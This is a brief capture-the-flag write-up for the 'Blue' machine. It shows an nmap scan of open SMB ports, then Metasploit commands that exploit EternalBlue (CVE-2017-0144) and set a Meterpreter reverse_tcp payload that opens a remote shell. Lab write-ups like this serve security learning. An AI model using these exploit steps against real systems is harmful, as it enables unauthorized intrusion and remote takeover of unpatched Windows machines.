# Blue Write-Up

Easy

Tags: 
`SMB`
`CVE-2017-0144`

## Intro

1. Eternal Blue

## Exploit

### Port scanning

```
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
```

### [Exploit EternalBlue with Metasploit](https://null-byte.wonderhowto.com/how-to/exploit-eternalblue-windows-server-with-metasploit-0195413/)

```
use exploit/windows/smb/ms17_010_eternalblue
```

```
set payload windows/x64/meterpreter/reverse_tcp
```

rhosts, lhost, lport > run